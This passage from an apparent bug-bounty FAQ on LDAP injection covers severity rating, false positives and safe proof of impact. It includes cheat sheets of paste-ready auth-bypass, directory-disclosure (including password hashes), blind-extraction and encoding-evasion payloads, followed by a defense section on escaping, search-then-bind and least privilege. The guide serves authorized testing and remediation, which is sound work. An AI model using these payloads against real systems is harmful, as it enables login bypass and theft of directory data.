Three requests: a normal value (baseline), `*)(objectClass=*` (does it widen / error?), and `)(uid=alice)` vs `)(uid=nobody)` (stable oracle?). If any shows altered logic, you have injection; pick the highest-impact path (auth bypass > disclosure > blind). If all three are inert and `\2a` shows in errors, it's escaped — pivot or move on.

### Q78. How do I decide which impact to chase first?
Highest-paying, easiest-to-prove: **auth bypass** if it's a login (Critical/High, one request), **authz bypass** if there's an injectable group check (High), **disclosure** if results reflect (`q=*`), then **blind extraction** (most effort). On an AD front-end in a red-team scope, enumeration→roasting is the escalation. Lead the report with whichever you cleanly proved.

### Q79. What do I record for the report as I test?
Exact endpoint/param/method, the backend (AD/OpenLDAP) and base DN (if leaked), the **context** (AND/OR, filter/DN, tolerant/strict), the payload, and the **before/after** evidence (row counts / auth result / oracle diff / a bounded extract). Note the safe-PoC discipline (own test account, bounded reads) — triagers reward restraint.

### Q80. When do I stop and write it up?
The moment you've proven **one** concrete impact safely: a login without valid creds (note the account), a widened result set beyond intended scope (bounded sample), a forged authz check (an admin action by a non-member), or a stable oracle + a short extract. Stop there — escalation beyond proof adds risk, not bounty (Q86).

---

# SEVERITY, VALIDITY & FALSE POSITIVES

### Q81. What are the most common LDAP-injection false positives?
- A `*` **reflected** in the page (reflection ≠ logic change).
- A **lone 500/LDAP error** with no subsequent exploitation (error-based is a *lead*).
- A **built-in wildcard search** behaving as designed (no scope excess).
- **Username enumeration via error-message differences** (a separate, lower bug).
- A **single noisy length blip** (caching/jitter — needs a *stable* oracle).
- `${jndi:ldap://…}` (that's **Log4Shell/JNDI** RCE, not filter injection).

### Q82. How do triagers rate LDAP injection?
```
Auth bypass → admin/privileged (ATO)          Critical
Auth bypass → normal user                     High
Authorization bypass / privesc (forged group) High
Full disclosure incl. readable hashes         High–Critical
Full user/email/group disclosure (no hashes)  High–Medium (scales with sensitivity)
Blind char-by-char extraction                 Medium–High
Error-based only (no logic change yet)        Low–Medium
Reflected * / lone 500                         not a finding
```

### Q83. What CVSS/CWE should I use?
**CWE-90** (LDAP Injection) is the anchor; parent **CWE-74**. Add **CWE-287** for authentication bypass and **CWE-285** for authorization bypass. Vectors: auth bypass→admin ≈ `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` (~9.1); disclosure ≈ `…/C:H/I:N/A:N` (~7.5). Adjust `PR` if authentication is required to reach the sink.

### Q84. Is re-testing a partial fix a new finding?
Yes. If the fix escapes `*` but not `(`/`)`, or escapes the **filter** but leaves the **DN** injectable, or blocks one breakout but not the absolute-true `(&)`, that's a fresh, valid finding. Always re-probe the full metacharacter set after a remediation — partial fixes are extremely common in LDAP code.

### Q85. How do I prove impact without violating privacy/scope?
Use **your own test account(s)**; for auth bypass land on a test-admin or stop at "logged in as `<first entry>`"; for disclosure read a **bounded** sample (a handful of records) with real PII **redacted**; for blind extract a **few** characters of a **benign** attribute on your test user. Demonstrate the *capability*, not the full data set.

### Q86. What's the operational risk to ME as a tester, and how do I manage it?
**Account lockout** of real users (failed binds), **directory load/DoS** (huge wildcards), **SIEM/IR noise** (errors + bind storms), and **privacy violations** (mass PII reads). Manage it: own-account testing, bounded wildcards, paced/low-concurrency blind extraction, minimal error probing, and no mass dump. Reckless LDAP testing is one of the faster ways to get removed from a program.

---

# CHEAT SHEETS

### Q87. Auth-bypass payload cheat (paste into the username field).
```
admin)(&)                       known user, absolute-true
admin)(|(uid=*                  known user, OR-true
*)(uid=*))(|(uid=*              unknown user, log in as first/any
*                  (pass=*)     both wildcarded
admin))%00                      NUL-truncate the password clause (C servers)
```

### Q88. Disclosure / enumeration cheat.
```
*                               widen
*)(objectClass=*)               whole subtree
*)(memberOf=*)                  pull group memberships
*)(userPassword=*)              readable hashes (if exposed)
(&(uid=NAME)(objectClass=*))    username existence (blind)
```

### Q89. Blind-extraction cheat.
```
ORACLE   TRUE  q=alice)(uid=alice)       FALSE  q=alice)(uid=nobody999)
EXTRACT  (&(uid=admin)(mail=a*)) → ab* → abc* …      (linear)
FAST     (&(uid=admin)(mail>=m*))                    (binary-search, ~log2)
TOOL     python3 poc/ldap_blind.py -u … --true "<marker>" --attr mail --target-uid testuser
```

### Q90. Escaping / evasion cheat.
```
FILTER escape (RFC 4515):  * \2a   ( \28   ) \29   \ \5c   NUL \00
DN escape    (RFC 4514):   , + " \ < > ; =   + leading/trailing space, leading #
URL-encode:  * %2a   ( %28   ) %29   \ %5c   & %26   | %7c   NUL %00
DOUBLE:      * %252a   ( %2528
ABSOLUTE:    (&) true   (|) false
TRUNCATE:    append %00
ALIASES:     objectClass↔objectCategory ; cn↔commonName ; case-insensitive attrs
```

---

# REAL-WORLD PATTERNS & REFERENCES

### Q91. What real-world apps/surfaces have shown LDAP injection?
Enterprise/intranet **SSO and corporate logins**, **VPN/gateway/appliance** and **printer/MFP** login portals, "**employee/people directory**" search, hand-rolled **group/role** authorization checks, LDAP-admin web UIs (e.g. phpLDAPadmin), and CMS LDAP-auth plugins (Joomla/WordPress). The common thread: a developer built an LDAP **filter via string concatenation** instead of an escaping API.

### Q92. What are the must-read references?
PortSwigger's *LDAP injection* topic (+ its lab), OWASP's *LDAP Injection* attack page, **WSTG-INPV-06** ("Testing for LDAP Injection"), the OWASP *LDAP Injection Prevention Cheat Sheet*, PayloadsAllTheThings *LDAP Injection*, HackTricks *LDAP injection*, and the RFCs — **4515** (filters), **4514** (DNs), **4526** (absolute true/false). Read 4515/4526 once; the absolute-true `(&)` trick clicks afterward.

### Q93. How do I keep current on this class?
LDAP injection itself is stable (the protocol changes slowly), so the "updates" are mostly **new sinks** (appliances/SSO products) and **AD tradecraft** (BloodHound edges, new roastable conditions). Follow appliance CVEs (Citrix/Fortinet/Pulse "authentication bypass" advisories often involve LDAP/filter logic), AD security research, and the PayloadsAllTheThings repo.

---

# DEFENSE — PREVENTING LDAP INJECTION

### Q94. What's the single most effective fix?
**Never build filters/DNs by string concatenation.** Use the binding's escaping API: PHP `ldap_escape($v, '', LDAP_ESCAPE_FILTER)` (and `LDAP_ESCAPE_DN`), `javax.naming` proper encoding / parameterized filters, .NET `DirectorySearcher` with escaped values, `ldap3`/`python-ldap` filter builders. Escaping per the correct context neutralises every metacharacter trick in this guide.

### Q95. Why must escaping be context-specific?
Because the **filter** special set (RFC 4515: `* ( ) \ NUL`) and the **DN** special set (RFC 4514: `, + " \ < > ; =`) are different. Escaping for one context leaves the other injectable (Q53). Apply `LDAP_ESCAPE_FILTER` to values that go into filters and `LDAP_ESCAPE_DN` to values that build DNs — using the wrong one is a real, common bug.

### Q96. Should I also validate/allowlist input?
Yes, as defense-in-depth. Allowlist the expected **charset** for usernames/search terms (e.g. `[A-Za-z0-9._-]`) and reject LDAP metacharacters outright. Validation isn't a substitute for escaping (an allowlisted value still needs escaping if it can contain any special char), but it shrinks the attack surface and blocks the obvious payloads.

### Q97. How should login be implemented securely?
**Search-then-bind:** (1) search for the user's DN by an escaped username (e.g. `(uid=<escaped>)`), then (2) perform an **LDAP bind** using that DN and the **user-supplied password** — let the directory verify the password. Never put the password into a filter and treat "≥1 match" as success (Q34). This makes auth-bypass injection ineffective because a forged search can't produce a valid bind.

### Q98. How do I prevent authorization-bypass injection specifically?
Don't concatenate the user's identifier into a `memberOf`/group filter. Resolve the authenticated user's DN/SID **server-side from the session** (not from a re-supplied parameter), then check membership with an escaped, server-controlled query — or better, read the group claims from the validated auth token. The identifier used in the check must come from trusted state, not request input.

### Q99. What hardening limits the blast radius if injection still happens?
Run the app's **directory service account least-privilege**: restrict which **attributes** and **OUs** it can read (so even a successful injection can't surface `userPassword`/sensitive attrs or cross into other subtrees). Enforce **account lockout/anomaly detection** on the bind path, **rate-limit** search/login, **log** filter errors, and disable **anonymous bind** if not required. These cap disclosure and slow blind extraction.

### Q100. Give me the defender's one-paragraph summary.
Treat every value that enters an LDAP filter or DN as hostile: **escape it for its exact context** (RFC 4515 for filters, RFC 4514 for DNs) using the platform's escaping API, **allowlist** expected input, and implement login as **search-then-bind** so the directory verifies passwords rather than the app trusting "an entry matched." Derive authorization identifiers from **trusted session state**, not request parameters. Then **minimise blast radius**: least-privilege service account with restricted attribute/OU read, account-lockout + rate-limiting on the bind path, no unnecessary anonymous bind, and error/anomaly logging. Do that and the entire attack tree in this document — auth bypass, disclosure, blind extraction, DN and second-order injection — collapses.

---

> **Final word:** LDAP injection rarely gives you a shell — and it doesn't need to. It gives you **the keys to the directory**: log in as admin, read the whole org, or forge "you're in the admins group." Detect it by changing the directory's *answer* (more rows / flipped auth / a stable oracle), get the **AND-vs-OR context** right to break out, prove **one** impact safely on your own test account, and report it as the auth bypass / disclosure it is. Authorized targets only — and clean up after yourself.
